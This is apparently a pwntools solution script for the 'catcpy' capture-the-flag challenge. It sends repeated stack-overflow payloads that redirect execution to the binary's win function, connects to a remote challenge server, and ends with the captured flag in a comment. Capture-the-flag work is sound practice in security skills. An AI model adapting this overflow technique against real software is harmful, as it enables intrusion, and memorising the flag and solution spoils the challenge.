from pwn import *
from icecream import ic

elf = exe = ELF("./catcpy")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.170.146.252", 13997)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

# sl(b'1')
# sl(b'a'*0xff)
# sl(b'2')
# sl(b'b'*0x19+b'a'*7)

sl(b'1')
sl(b'a'*0xff)
sl(b'2')
sl(b'b'*0x19+b'a'*6)

sl(b'1')
sl(b'a'*0xff)
sl(b'2')
sl(b'b'*0x19+b'a'*5)

sl(b'1')
sl(b'a'*0xff)
sl(b'2')
sl(b'b'*0x19+b'a'*4)

sl(b'1')
sl(b'a'*0xff)
sl(b'2')
sl(b'b'*0x19+b'a'*3)

sl(b'1')
sl(b'a'*0xff)
sl(b'2')
sl(b'b'*0x19+p64(elf.sym['win']))

sl(b'3')
io.interactive()

# Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}